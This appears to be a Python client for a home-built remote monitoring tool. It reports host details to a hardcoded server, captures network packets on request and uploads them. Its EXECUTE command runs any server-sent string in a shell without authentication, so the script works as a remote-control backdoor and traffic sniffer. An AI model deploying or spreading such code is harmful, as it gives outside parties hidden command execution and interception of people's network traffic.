import socket
import os
import subprocess
import platform
import re
import time
import struct
import json

# Global variables for server configuration
SERVER_IPS = ["192.168.2.7"]
SERVER_PORT = 5000

def get_ip_addresses():
    """Collect all IPv4 addresses from network interfaces."""
    system = platform.system()
    if system == 'Linux':
        try:
            output = subprocess.check_output(["ip", "addr", "show"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "inet " in line and "inet6" not in line:  # IPv4 only
                    parts = line.split()
                    ip = parts[1].split("/")[0]
                    ip_addresses.append(ip)
            return ip_addresses
        except Exception as e:
            print(f"Error getting IP addresses on Linux: {e}")
            return []
        
    elif system == 'Windows':
        try:
            output = subprocess.check_output(["ipconfig"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "IPv4 Address" in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        ip = parts[1].strip()
                        if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ip):
                            ip_addresses.append(ip)
            return ip_addresses
        except Exception as e:
            print(f"Error getting IP addresses on Windows: {e}")
            return []
    else:
        try: # Tries to get the IP address should the platform not show up as "Linux"
            output = subprocess.check_output(["ip", "addr", "show"], text=True)
            ip_addresses = []
            for line in output.splitlines():
                if "inet " in line and "inet6" not in line:  # IPv4 only
                    parts = line.split()
                    ip = parts[1].split("/")[0]
                    ip_addresses.append(ip)
            return ip_addresses
        
        except Exception as e:
            print(f"Error getting IP addresses on unknown OS: {e}")
            return []

def capture_packets_sockets(duration):
    """Capture packets for a specified duration and return a PCAP file."""
    try:
        # Requires root privileges on Linux
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        start_time = time.time()
        packets = []
        while time.time() - start_time < int(duration):
            packet, _ = sock.recvfrom(65535)
            timestamp = time.time()
            packets.append((timestamp, packet))
        print("capture complete")
        # Construct PCAP file
        # Global header: magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
        pcap_global_header = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
        pcap_data = pcap_global_header
        for ts, packet in packets:
            sec = int(ts)
            usec = int((ts - sec) * 1000000)
            len_cap = len(packet)
            # Packet header: ts_sec, ts_usec, incl_len, orig_len
            pcap_packet_header = struct.pack("<IIII", sec, usec, len_cap, len_cap)
            pcap_data += pcap_packet_header + packet
        sock.close()
        print("returning data")
        return pcap_data
    except PermissionError:
        print("Packet capture requires root privileges.")
        return b""
    except Exception as e:
        print(f"Error capturing packets: {e}")
        return b""
        
def capture_packets_tcpdump(count=1000, filename="read1.pcap"):
    print(f" Beginning capture: {count} packets")
    try:
        # Validate count
        count = int(count)
        if count <= 0:
            raise ValueError("Count must be positive")
            
        # Use subprocess instead of os.system for better security
        cmd = ["tcpdump", "-c", str(count), "-w", filename]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        if process.returncode == 0:
            print("Capture Finished")
            return filename
        else:
            print(f"Capture Failed: {process.stderr}")
            return None
    except ValueError as ve:
        print(f"Invalid count: {ve}")
        return None
    except Exception as e:
        print(f"Error during capture: {e}")
        return None
    

def main():
    """Client main function."""
    # Collect client information
    hostname = socket.gethostname()
    try:
        username = os.getlogin()
    except:
        username = os.environ.get("USER", "unknown")
        
    try:
        try:
            operating_system = os.uname()
        except:
            operating_system = platform.system()
    except Exception as e:
        operating_system = f"Unable to retrieve OS Info: {e}"
        
    
    ip_addresses = get_ip_addresses()
    info = {
        "hostname": hostname,
        "username": username,
        "ip_addresses": ip_addresses,
        "operating_system": operating_system
    }

    # Connect to server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    for server_ip in SERVER_IPS:
        try:
            client_socket.connect((server_ip, SERVER_PORT))
            print(f"Connected to server at {server_ip}:{SERVER_PORT}")
            break
        except Exception as e:
            print(f"Failed to connect to {server_ip}: {e}")
            continue
    else:
        print("Could not connect to any server.")
        return

    # Send initial information
    client_socket.send(json.dumps(info).encode())
    print(json.dumps(info).encode())
    
    
    
    # Listen for commands
    x = 0
    timeout = False
    while not timeout:
        try:
            print(f"listening {x}")
            x += 1
            
            client_socket.settimeout(30)  # 30 seconds
            try:
                command = client_socket.recv(1024).decode().strip()
            except socket.timeout:
                print(f"Timeout waiting for command")
                timeout=True
                break
            
            if not command:
                print("breaking")
                break
            
            print(f"recieved command {command}")
            if command.startswith("CAPTURE SOCKETS"):
                
                duration = command.split()[2]
                print(f"Starting Packet Capture: {duration} seconds")
                pcap_data = capture_packets_sockets(duration)
                if pcap_data:
                    client_socket.send(f"PCAP {len(pcap_data)}\n".encode())
                    client_socket.sendall(pcap_data)
                    print("data sent SOCKET")
                    
            elif command.startswith("CAPTURE TCPDUMP"):
                try:
                    count = command.split()[2]
                    pcap_file = capture_packets_tcpdump(count)
                    if pcap_file and os.path.exists(pcap_file):
                        print(f"returning file {pcap_file}")
                        with open(pcap_file, 'rb') as f:
                            pcap_data = f.read()
                        client_socket.send(f"PCAP {len(pcap_data)}\n".encode())
                        client_socket.sendall(pcap_data)
                        print("data sent TCP")
                    else:
                        client_socket.send("PCAP ERROR\n".encode())
                except IndexError:
                    client_socket.send("PCAP ERROR: Count required\n".encode())
                except Exception as e:
                    client_socket.send(f"PCAP ERROR: {str(e)}\n".encode())
                    
            elif command.startswith("EXECUTE"):
                cmd = command.split(maxsplit=1)[1]
                try:
                    result = subprocess.run(
                        cmd, shell=True, capture_output=True, text=True, timeout=30
                    )
                    output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}"
                except Exception as e:
                    output = f"Error executing command: {e}"
                client_socket.send(f"OUTPUT {len(output)}\n".encode())
                client_socket.sendall(output.encode())
            
        except Exception as e:
            print(f"Error: {e}")
            break
    print ("Closing Connection")
    client_socket.close()
    
    if timeout:
        main()

if __name__ == "__main__":
    main()